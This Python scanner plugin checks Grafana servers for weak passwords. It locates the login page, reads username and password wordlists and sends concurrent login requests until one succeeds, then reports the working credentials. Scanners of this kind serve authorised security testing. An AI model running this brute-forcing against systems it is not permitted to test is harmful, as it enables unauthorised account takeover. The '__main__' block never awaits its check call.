#!/usr/bin/env python3

import asyncio
from app.lib.common import get_useragent
from app.lib.request import request

class Grafana_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Grafana弱口令漏洞',
            'description': 'Grafana弱口令漏洞',
            'date': '',
            'exptype': 'check',
            'type': 'Weakpwd'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }
    
    async def handle(self, url, data, user, pwd):
        
        """
        发送请求,判断内容

        :param str url: 请求url
        :param str data: 请求的数据
        :param str user: 用户名
        :param str pwd: 密码

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            req = await request.post(url, headers = self.headers, data = data)
            if req.status == 200 and "Logged in" in await req.text():
                result = "user: %s pwd: %s" %(user, pwd)
                return True, '存在Grafana弱口令漏洞,弱口令为: ' + result
        except Exception as e:
            # print(e)
            pass

    async def check_url(self, url):
        
        """
        检测是否存在登陆地址

        :param:

        :return str url: 登录url
        """
        
        try:
            req = await request.get(url, headers = self.headers)
            if '<title>Grafana</title>' in await req.text() and req.status == 200:
                return url
        except Exception as e:
            # print(e)
            pass

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        valid_url = ""
        urls = []
        urls.append(self.url + '/grafana/login')
        urls.append(self.url + '/login')
        for url in urls:
            if await self.check_url(url):
                valid_url = url
                break
        if valid_url != "":
            tasks = []
            for user in open('app/data/username.txt', 'r', encoding = 'utf-8').readlines():
                user = user.strip()
                for pwd in open('app/data/password.txt', 'r', encoding = 'utf-8').readlines():
                    if pwd != '':
                        pwd = pwd.strip()
                    post_data = r'{"user":"%s","email":"","password":"%s"}'%(user, pwd)
                    self.headers['Content-Type'] = 'application/json;charset=UTF-8'
                    task = asyncio.create_task(self.handle(valid_url, post_data, user, pwd))
                    tasks.append(task)
        
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    return True, result[1]

if __name__ == '__main__':
    Grafana_Weakpwd = Grafana_Weakpwd_BaseVerify('http://127.0.0.1:3000')
    Grafana_Weakpwd.check()